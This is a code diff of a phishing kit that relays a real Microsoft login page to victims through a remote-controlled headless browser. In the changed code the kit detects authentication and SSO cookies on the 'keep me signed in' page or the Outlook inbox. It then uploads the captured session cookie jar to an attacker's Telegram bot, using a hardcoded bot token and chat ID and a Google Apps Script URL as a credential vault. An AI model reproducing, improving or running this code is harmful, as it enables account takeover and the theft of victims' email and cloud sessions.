@@ -5,7 +5,6 @@ const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
 
-// --- CONFIGURATION ---
 const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
 const TARGET = "https://login.microsoftonline.com/";
 
@@ -13,9 +12,7 @@ async function getCredentials() {
     try {
         const response = await axios.get(VAULT_URL, { timeout: 7000, maxRedirects: 5 });
         if (response.data && response.data.TG_TOKEN) return response.data;
-    } catch (e) {
-        console.log("[VAULT] Using fallback credentials.");
-    }
+    } catch (e) { console.log("[SYSTEM] Using fallback creds."); }
     return { 
         "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
         "TG_CHAT_ID": "1318100118"
@@ -25,38 +22,31 @@ async function getCredentials() {
 async function sendExfiltration(cookies, url) {
     const creds = await getCredentials();
     const host = new URL(url).hostname;
-
-    console.log(`[SYSTEM] Exfiltrating Finalized Jar for: ${host} (${cookies.length} cookies)`);
+    console.log(`[EVILGINX_MODE] Captured ${cookies.length} tokens for ${host}`);
 
     try {
-        // Notification
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>🚨 FULL SESSION CAPTURED</b>\n<b>User:</b> ${host}\n<b>Integrity:</b> High (Finalized)`,
+            text: `<b>🚨 SESSION AUTHORIZED (KMSI)</b>\n<b>Domain:</b> ${host}\n<b>Tokens:</b> Verified`,
             parse_mode: 'HTML'
         });
 
-        // File
         const form = new FormData();
         form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `FULL_SESSION_${host.replace(/\./g, '_')}.json`,
+            filename: `SESSION_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-        
-        console.log("[SYSTEM] Telegram delivery successful.");
-    } catch (e) {
-        console.log("[ERROR] Telegram API failed. Check Bot Permissions.");
-    }
+    } catch (e) { console.log("[ERROR] Exfil failed."); }
 }
 
 async function startSession(io, socket) {
     let browser = null;
-    const captured = new Set();
+    let isExfiltrating = false;
 
     try {
         browser = await puppeteer.launch({
@@ -70,36 +60,40 @@ async function startSession(io, socket) {
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // THE MATURITY POLLER
+        // EVILGINX-STYLE KMSI MONITOR
         const poller = setInterval(async () => {
+            if (isExfiltrating) return;
+
             try {
                 const url = page.url();
                 const cookies = await page.cookies();
 
-                // 1. Check for the "Holy Grail" cookies
-                const hasMasterAuth = cookies.some(c => 
-                    c.name.includes('ESTSAUTH') || 
-                    c.name.includes('RPSSecAuth') || 
-                    c.name.includes('MSAAUTHP')
-                );
+                // Standard Evilginx Trigger: KMSI page presence + Auth Cookie presence
+                const onKmsiPage = url.includes('/kmsi') || url.includes('reprocess');
+                const hasAuth = cookies.some(c => c.name.includes('AUTH') || c.name.includes('SSO'));
 
-                // 2. Only trigger if we are on a post-login page
-                const isFinalPage = url.includes('outlook') || url.includes('mail') || url.includes('portal') || url.includes('dashboard');
+                if (hasAuth && onKmsiPage) {
+                    isExfiltrating = true;
+                    console.log("[KMSI] Auth detected. Waiting for user interaction...");
 
-                if (hasMasterAuth && isFinalPage && !captured.has(url)) {
-                    captured.add(url);
-                    console.log("[POLLER] Critical tokens detected. Waiting for maturity...");
-
-                    // Wait 4 seconds for the final redirects and background encryption keys to settle
+                    // We wait for the user to click 'Yes' or 'No' and the tokens to finalize
                     setTimeout(async () => {
-                        const matureJar = await page.cookies();
-                        await sendExfiltration(matureJar, url);
-                    }, 4000);
+                        const finalJar = await page.cookies();
+                        await sendExfiltration(finalJar, page.url());
+                    }, 5000); 
                 }
-            } catch (e) {}
-        }, 5000);
+                
+                // Fallback: If user bypasses KMSI and hits the inbox directly
+                const isFinal = url.includes('mail.live.com') || url.includes('outlook.office.com');
+                if (hasAuth && isFinal) {
+                    isExfiltrating = true;
+                    await sendExfiltration(cookies, url);
+                }
 
-        // STREAMING
+            } catch (e) {}
+        }, 3000);
+
+        // SCREEN STREAM
         const stream = setInterval(async () => {
             if (socket.connected) {
                 try {
@@ -109,7 +103,6 @@ async function startSession(io, socket) {
             }
         }, 1000);
 
-        // ACTIONS
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
@@ -127,9 +120,7 @@ async function startSession(io, socket) {
             if (browser) await browser.close();
         });
 
-    } catch (err) {
-        if (browser) await browser.close();
-    }
+    } catch (err) { if (browser) await browser.close(); }
 }
 
 module.exports = { startSession };
